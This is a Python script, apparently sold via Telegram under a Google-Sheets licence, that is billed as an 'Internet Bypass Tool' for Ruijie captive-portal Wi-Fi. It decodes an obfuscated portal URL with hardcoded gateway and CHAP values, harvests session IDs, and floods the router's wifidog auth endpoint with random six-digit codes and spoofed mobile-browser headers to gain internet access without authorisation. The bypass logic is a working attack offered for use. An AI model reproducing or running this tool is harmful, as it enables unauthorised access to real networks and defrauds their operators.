#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import time
import json
import base64
import random
import string
import hashlib
import requests
import threading
import aiohttp
import asyncio
import ping3
from datetime import datetime, date
from urllib.parse import quote, urlparse, parse_qs, urljoin

# ==========================================
# 0. GOOGLE SHEETS LICENSE SYSTEM
# ==========================================

SHEET_CSV_URL = "https://docs.google.com/spreadsheets/d/e/2PACX-1vRHuCFYFfPifwKT1rKKiq5-w-Y2vUq2nSryaewyMJLOQW1hXD0rvFhfmF8LRJ2bG1YfSNXnhy8LmHzA/pub?output=csv"

LICENSE_STORAGE = os.path.expanduser("~/.ruijie_license.json")
KEY_STORAGE_FILE = os.path.expanduser("~/.ruijie_device_key.txt")

def get_stable_device_id():
    if os.path.exists(KEY_STORAGE_FILE):
        try:
            with open(KEY_STORAGE_FILE, 'r') as f:
                saved_key = f.read().strip()
                if saved_key:
                    return saved_key
        except:
            pass
    
    try:
        import subprocess
        android_id = subprocess.check_output("settings get secure android_id", shell=True, stderr=subprocess.DEVNULL).decode().strip()
        if android_id and len(android_id) > 5:
            stable_key = hashlib.md5(f"STABLE_{android_id}".encode()).hexdigest()[:16]
        else:
            import uuid
            install_path = os.path.dirname(os.path.abspath(__file__))
            stable_key = hashlib.md5(f"{install_path}{uuid.getnode()}".encode()).hexdigest()[:16]
    except:
        stable_key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    
    try:
        with open(KEY_STORAGE_FILE, 'w') as f:
            f.write(stable_key)
    except:
        pass
    
    return stable_key

def save_license_to_cache(expiry_date_str):
    data = {"device_id": get_stable_device_id(), "expiry": expiry_date_str, "verified_at": datetime.now().isoformat()}
    try:
        with open(LICENSE_STORAGE, 'w') as f:
            json.dump(data, f)
        return True
    except:
        return False

def load_license_from_cache():
    if not os.path.exists(LICENSE_STORAGE):
        return None
    try:
        with open(LICENSE_STORAGE, 'r') as f:
            data = json.load(f)
            if data.get("device_id") == get_stable_device_id():
                return data
    except:
        pass
    return None

def fetch_online_license():
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            return response.text.strip().split('\n')
    except:
        pass
    return None

def verify_license_online():
    sys_key = get_stable_device_id()
    lines = fetch_online_license()
    
    if lines is None:
        return None, None, "NETWORK_ERROR"
    
    for line in lines:
        line = line.strip()
        if not line or line.lower().startswith('key') or line.lower().startswith('device'):
            continue
        data = [d.strip().strip('"') for d in line.split(',')]
        if data and data[0] == sys_key:
            expiry_str = data[2] if len(data) >= 3 else "UNLIMITED"
            if len(data) >= 4 and "BLOCK" in data[3].upper():
                return False, expiry_str, "BLOCKED"
            if expiry_str != "UNLIMITED":
                try:
                    expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d").date()
                    if date.today() > expiry_date:
                        return False, expiry_str, "EXPIRED"
                except:
                    pass
            return True, expiry_str, "ACTIVE"
    
    return False, "N/A", "NOT_FOUND"

def check_license():
    sys_key = get_stable_device_id()
    print(f"[+] Device ID: {sys_key}")
    
    online_result, expiry_str, msg = verify_license_online()
    
    if online_result is True:
        print(f"{g}[✓] License ACTIVE (Expires: {expiry_str}){w}")
        save_license_to_cache(expiry_str)
        return True
    elif online_result is False:
        print(f"{r}[✗] License INVALID: {msg}{w}")
        cached = load_license_from_cache()
        if cached:
            cached_expiry = cached.get("expiry", "UNLIMITED")
            if cached_expiry != "UNLIMITED":
                try:
                    expiry_date = datetime.strptime(cached_expiry, "%Y-%m-%d").date()
                    if date.today() <= expiry_date:
                        print(f"{g}[✓] Using CACHED license (Expires: {cached_expiry}){w}")
                        return True
                except:
                    pass
        return False
    else:
        cached = load_license_from_cache()
        if cached:
            cached_expiry = cached.get("expiry", "UNLIMITED")
            if cached_expiry != "UNLIMITED":
                try:
                    expiry_date = datetime.strptime(cached_expiry, "%Y-%m-%d").date()
                    if date.today() <= expiry_date:
                        print(f"{g}[✓] Using CACHED license (Offline, Expires: {cached_expiry}){w}")
                        return True
                except:
                    pass
        print(f"{r}[✗] No valid license found (Need internet for first activation){w}")
        return False

# ==========================================
# COLORS
# ==========================================

def clear():
    os.system("clear")

w = "\033[1;00m"
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
b = "\033[1;34m"

def Line():
    print(f"{y}-{w}"*os.get_terminal_size()[0])

def Logo():
    clear()
    logo = f"""{r}
        ____       _________   _________   _______   __    _
       / __ \     |___   ___| |__   __  | |  _____| |  \  | |
      / /__\ \        | |        | |  | | | |_____  |   \ | |
     / ______ \       | |        | |  | | |  _____| | |\ \| |
    / /      \ \   ___| |___   __| |__| | | |_____  | | \   |
   /_/        \_\ |_________| |_________| |_______| |_|  \__|
  
   {g}          {g}AIDEN TEAM{g} {w}Internet Bypass Tool{w}
{g}     {w}「 {w}Google Sheets License System 」{w}"""
    print(logo)
    Line()
    print(f"{w}[+] {r} Creator by AIDEN")
    print(f"{w}[+] {r} This tool is for Ruijie Network Router")
    print(f"{w}[+] {r} Owner Telegram account is {g}@aiden2410")
    print(f"{w}[+] {r} Admin Telegram account is {g}@neoneo2008")
    print(f"{w}[+] {r} License: Google Sheets (Owner Controlled)")
    Line()

# ==========================================
# INTERNET BYPASS FUNCTIONS
# ==========================================

async def get_session_id(session, session_url, previous_session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with session.get(session_url, headers=headers) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response).group(1)
            return session_id
    except Exception as e:
        return previous_session_id

class InternetAccess:
    def __init__(self):
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
        
        try:
            self.ip = open(".ip", "r").read().strip()
        except FileNotFoundError:
            print(f"{r}[!] Ip not found. Please run setup first.{w}")
            print(f"{y}[!] You need to run setup to capture gateway IP{w}")
            sys.exit()

    def get_random_code(self):
        random_code = "".join(random.choice(string.digits) for _ in range(6))
        return random_code

    async def send_request(self, session, session_id, log=True):
        random_code = self.get_random_code()
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        params = {
            'token': session_id,
            'phoneNumber': random_code,
        }
        try:
            async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params=params, headers=headers) as response:
                if log:
                    status_code = f"{g}{response.status}"
                    now = f"{b}{time.strftime('%H-%M-%S')}"
                    ping_status = await asyncio.to_thread(ping3.ping, 'google.com')
                    ping = self.get_ping(ping_status)
                    is_open = await self.is_internet_access(session)
                    print(f"{w}time: {now}, {w}status: {status_code}, {w}ping: {ping}, {w}internet-open: {is_open}")
        except:
            return
    
    async def is_internet_access(self, session):
        try:
            async with session.get("https://httpbin.org/") as req:
                return f"{g}True{w}"
        except:
            return f"{r}False{w}"
    
    def get_ping(self, ping):
        if ping is None:
            return f'{r}Unknown{w}'
        else:
            ping = int(ping * 1000)
            if ping >= 100:
                return f'{r}{ping}{w}'
            elif ping >= 90 and ping < 100:
                return f'{y}{ping}{w}'
            if ping < 90:
                return f'{g}{ping}{w}'
    
    async def execute(self):
        Logo()
        print(f"{g}[+] Internet Bypass Mode")
        print(f"{g}[+] If there are no logs for a long time, turn your Wi-Fi off and on")
        Line()
        connector = aiohttp.TCPConnector(limit=10)
        timeout = aiohttp.ClientTimeout(total=10)
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                loop = 0
                tasks = []
                continue_running = True
                while continue_running:
                    if loop % 5 == 0:
                        session_id = await get_session_id(session, self.session_url, None)
                    tasks.append(self.send_request(session, session_id, log=True))
                    if len(tasks) >= 5:
                        await asyncio.gather(*tasks)
                        tasks = []
                    loop += 1
                    await asyncio.sleep(1)
        except KeyboardInterrupt:
            print(f"{y}[*] User cancel called")
            sys.exit()

# ==========================================
# SETUP FUNCTION (For first time)
# ==========================================

def setup():
    Logo()
    print(f"{g}[+] Setup Mode - Capturing Gateway Info{w}")
    print(f"{y}[!] Make sure you are connected to the Wi-Fi{w}")
    Line()
    
    try:
        localhost = requests.get("http://192.168.0.1", timeout=10).url
        ip = re.search(r'gw_address=(.*?)&', localhost).group(1)
        
        print(f"{g}[✓] Gateway IP: {ip}{w}")
        
        with open(".ip", "w") as f:
            f.write(ip)
        
        print(f"{g}[✓] Gateway IP saved to .ip file{w}")
        
        # Try to get session URL
        try:
            headers = {
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36',
            }
            req = requests.get(localhost, headers=headers).text
            session_url_match = re.search(r"href='(.*?)'</script>", req)
            if session_url_match:
                session_url = "https://portal-as.ruijienetworks.com" + session_url_match.group(1)
                with open(".session_url", "w") as f:
                    f.write(session_url)
                print(f"{g}[✓] Session URL saved{w}")
        except:
            print(f"{y}[!] Could not extract session URL (may work anyway){w}")
        
        Line()
        print(f"{g}[✓] Setup completed successfully!{w}")
        print(f"{g}[✓] Now you can run: python bypass.py -o internet{w}")
        
    except Exception as err:
        print(f"{r}[✗] Setup failed: {err}{w}")
        print(f"{y}[!] Make sure you are connected to the Wi-Fi and try again{w}")
        sys.exit(0)

# ==========================================
# MAIN
# ==========================================

def main():
    Logo()
    
    # Check license first
    if not check_license():
        print(f"{r}[!] License check failed. Use --key to get your device ID.{w}")
        print(f"{y}[!] Add your device ID to Google Sheets Column A{w}")
        sys.exit(1)
    
    if len(sys.argv) > 1:
        if sys.argv[1] == "-o" and len(sys.argv) > 2:
            if sys.argv[2] == "internet":
                iobj = InternetAccess()
                asyncio.run(iobj.execute())
            elif sys.argv[2] == "setup":
                setup()
            else:
                print(f"{y}[!] Unknown option. Use: -o internet or -o setup{w}")
        elif sys.argv[1] == "--key":
            print(f"\n{g}Device ID: {get_stable_device_id()}{w}")
            print(f"{y}Add this to Column A in Google Sheets{w}")
            sys.exit(0)
        elif sys.argv[1] == "--reset":
            for f in [LICENSE_STORAGE, KEY_STORAGE_FILE]:
                if os.path.exists(f):
                    os.remove(f)
            print(f"{g}[✓] License cache cleared{w}")
            sys.exit(0)
        else:
            print(f"{y}[!] Usage:{w}")
            print(f"  python internet.py --key          (Show device ID)")
            print(f"  python internet.py --reset        (Clear license cache)")
            print(f"  python internet.py -o setup       (First time setup)")
            print(f"  python internet.py -o internet    (Start internet bypass)")
    else:
        print(f"{y}[!] Usage:{w}")
        print(f"  python internet.py --key          (Show device ID)")
        print(f"  python internet.py --reset        (Clear license cache)")
        print(f"  python internet.py -o setup       (First time setup)")
        print(f"  python internet.py -o internet    (Start internet bypass)")

if __name__ == "__main__":
    main()
